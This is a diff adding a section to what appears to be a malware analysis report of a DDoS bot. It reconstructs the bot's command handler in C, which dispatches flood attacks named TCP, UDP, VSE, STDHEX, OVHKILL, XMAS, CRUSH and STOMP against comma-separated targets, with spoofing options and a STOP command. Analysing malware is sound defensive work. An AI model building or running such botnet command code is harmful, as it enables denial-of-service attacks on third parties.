@@ -453,6 +453,255 @@ for (pid_index = 0; (ulong)(long)(int)pid_index < numpids; pid_index = pid_index
 ---
 
 
+#### 5. **Command Processing** processCmd() L: 4773
+
+- **Input:**  
+  - `param_count`: Number of parameters in the command.
+  - `params`: Array of pointers to parameters (strings).
+- **Behavior:**  
+  - Checks the first parameter (the command type, e.g., "TCP", "UDP", etc.).
+  - Validates and parses the rest of the parameters.
+  - For each supported command, forks a process and launches the corresponding attack function.
+  - Supports multiple targets by splitting the target string on commas.
+  - Has a "STOP" command to kill all child processes.
+
+
+```c
+void processCmd(int param_count, char **params) {
+    char *cmd = params[0];
+
+    // --- TCP Attack ---
+    if (strcmp(cmd, "TCP") == 0) {
+        if (param_count < 6) return;
+        char *targets = params[1];
+        int port = atoi(params[2]);
+        int seconds = atoi(params[3]);
+        int packetsize = atoi(params[4]);
+        char *payload = params[5];
+        int interval = (param_count == 8) ? atoi(params[7]) : 10;
+        int spoof = (param_count >= 7) ? atoi(params[6]) : 0;
+
+        // Multiple targets support
+        char *tok = strtok(targets, ",");
+        do {
+            if (listFork() == 0) {
+                ftcp(tok, port, seconds, packetsize, payload, spoof, interval);
+                _exit(0);
+            }
+        } while ((tok = strtok(NULL, ",")) != NULL);
+        return;
+    }
+
+    // --- UDP Attack ---
+    if (strcmp(cmd, "UDP") == 0) {
+        if (param_count < 6) return;
+        int port = atoi(params[2]);
+        int seconds = atoi(params[3]);
+        int packetsize = atoi(params[4]);
+        int interval = (param_count == 6) ? atoi(params[5]) : 10;
+        if (port == -1 || seconds == -1 || packetsize == -1 || packetsize > 0x400 || interval < 1) return;
+
+        char *targets = params[1];
+        char *tok = strtok(targets, ",");
+        do {
+            if (listFork() == 0) {
+                SendUDP(tok, port, seconds, packetsize, interval, 0x20);
+                _exit(0);
+            }
+        } while ((tok = strtok(NULL, ",")) != NULL);
+        return;
+    }
+
+    // --- VSE Attack ---
+    if (strcmp(cmd, "VSE") == 0) {
+        if (param_count < 6) return;
+        int port = atoi(params[2]);
+        int seconds = atoi(params[3]);
+        int packetsize = atoi(params[4]);
+        int count = atoi(params[5]);
+        if (port == -1 || seconds == -1 || packetsize == -1 || count == -1 || count > 0x10000 || count > 0xffdc || packetsize > 0x20) return;
+        int interval = (param_count >= 7) ? atoi(params[6]) : 1000;
+        int delay = (param_count >= 8) ? atoi(params[7]) : 1000000;
+        int spoof = (param_count >= 9) ? atoi(params[8]) : 0;
+
+        char *targets = params[1];
+        char *tok = strtok(targets, ",");
+        do {
+            if (listFork() == 0) {
+                vseattack(tok, port, seconds, packetsize, count, interval, delay, spoof);
+                _exit(0);
+            }
+        } while ((tok = strtok(NULL, ",")) != NULL);
+        return;
+    }
+
+    // --- STDHEX Attack ---
+    if (strcmp(cmd, "STDHEX") == 0) {
+        if (param_count < 4) return;
+        int seconds = atoi(params[2]);
+        int packetsize = atoi(params[3]);
+        if (seconds < 1 || packetsize < 1) return;
+
+        char *targets = params[1];
+        char *tok = strtok(targets, ",");
+        do {
+            if (listFork() == 0) {
+                SendSTDHEX(tok, seconds, packetsize);
+                _exit(0);
+            }
+        } while ((tok = strtok(NULL, ",")) != NULL);
+        return;
+    }
+
+    // --- STD Attack ---
+    if (strcmp(cmd, "STD") == 0) {
+        if (param_count < 4) return;
+        int seconds = atoi(params[2]);
+        int packetsize = atoi(params[3]);
+        if (seconds < 1 || packetsize < 1) return;
+
+        char *targets = params[1];
+        char *tok = strtok(targets, ",");
+        do {
+            if (listFork() == 0) {
+                SendSTD(tok, seconds, packetsize);
+                _exit(0);
+            }
+        } while ((tok = strtok(NULL, ",")) != NULL);
+        return;
+    }
+
+    // --- NFODROP Attack ---
+    if (strcmp(cmd, "NFODROP") == 0) {
+        if (param_count < 4) return;
+        int seconds = atoi(params[2]);
+        int packetsize = atoi(params[3]);
+        if (seconds < 1 || packetsize < 1) return;
+
+        char *targets = params[1];
+        char *tok = strtok(targets, ",");
+        do {
+            if (listFork() == 0) {
+                stdhexflood(tok, seconds, packetsize);
+                _exit(0);
+            }
+        } while ((tok = strtok(NULL, ",")) != NULL);
+        return;
+    }
+
+    // --- OVHKILL Attack ---
+    if (strcmp(cmd, "OVHKILL") == 0) {
+        if (param_count < 4) return;
+        int seconds = atoi(params[2]);
+        int packetsize = atoi(params[3]);
+        if (seconds < 1 || packetsize < 1) return;
+
+        char *targets = params[1];
+        char *tok = strtok(targets, ",");
+        do {
+            if (listFork() == 0) {
+                SendSTD_HEX(tok, seconds, packetsize);
+                _exit(0);
+            }
+        } while ((tok = strtok(NULL, ",")) != NULL);
+        return;
+    }
+
+    // --- XMAS Attack ---
+    if (strcmp(cmd, "XMAS") == 0) {
+        if (param_count < 4) return;
+        int packetsize = atoi(params[3]);
+        if (packetsize > 10000) return;
+
+        char *targets = params[1];
+        int seconds = atoi(params[2]);
+        char *tok = strtok(targets, ",");
+        do {
+            if (listFork() == 0) {
+                rtcp(tok, seconds, packetsize, 0x20, 0x400, 10);
+                _exit(0);
+            }
+        } while ((tok = strtok(NULL, ",")) != NULL);
+        return;
+    }
+
+    // --- CRUSH Attack ---
+    if (strcmp(cmd, "CRUSH") == 0) {
+        if (param_count < 6) return;
+        int port = atoi(params[2]);
+        int seconds = atoi(params[3]);
+        int packetsize = atoi(params[4]);
+        char *payload = params[5];
+        if (port == -1 || seconds == -1 || packetsize == -1 || packetsize > 0x20) return;
+        int spoof = (param_count >= 7) ? atoi(params[6]) : 0;
+        int interval = (param_count == 8) ? atoi(params[7]) : 10;
+
+        char *targets = params[1];
+        char *tok = strtok(targets, ",");
+        do {
+            if (listFork() == 0) {
+                astd(tok, port, seconds, 0x5b4);
+                atcp(tok, port, seconds, packetsize, payload, spoof, interval);
+                close(mainCommSock);
+                _exit(0);
+            }
+        } while ((tok = strtok(NULL, ",")) != NULL);
+        return;
+    }
+
+    // --- STOMP Attack ---
+    if (strcmp(cmd, "STOMP") == 0) {
+        if (param_count < 6) return;
+        int port = atoi(params[2]);
+        int seconds = atoi(params[3]);
+        int packetsize = atoi(params[4]);
+        char *payload = params[5];
+        if (port == -1 || seconds == -1 || packetsize == -1 || packetsize > 0x20) return;
+        int spoof = (param_count >= 7) ? atoi(params[6]) : 0;
+        int interval = (param_count == 8) ? atoi(params[7]) : 10;
+
+        char *targets = params[1];
+        char *tok = strtok(targets, ",");
+        do {
+            if (listFork() == 0) {
+                astd(tok, port, seconds, spoof);
+                audp(tok, port, seconds, packetsize, spoof, interval);
+                atcp(tok, port, seconds, packetsize, payload, spoof, interval);
+                close(mainCommSock);
+                _exit(0);
+            }
+        } while ((tok = strtok(NULL, ",")) != NULL);
+        return;
+    }
+
+    // --- STOP Command ---
+    if (strcmp(cmd, "STOP") == 0) {
+        for (ulong i = 0; i < numpids; i++) {
+            pid_t pid = pids[i];
+            if (pid != 0 && pid != getpid()) {
+                kill(pid, 9);
+            }
+        }
+        return;
+    }
+}
+```
+
+---
+
+##### **Key Points**
+
+- **Forking:**  
+  Each attack is run in a child process (`listFork()`), so the main process can continue to accept commands.
+- **Multiple Targets:**  
+  If the target parameter contains commas, it splits and attacks each target in a separate process.
+- **Parameter Validation:**  
+  Each command checks for valid parameter counts and values before launching attacks.
+- **STOP Command:**  
+  Kills all child processes except itself.
+
+---
+
 
 ## Virus Total Report
 ## Dynamic Analysis
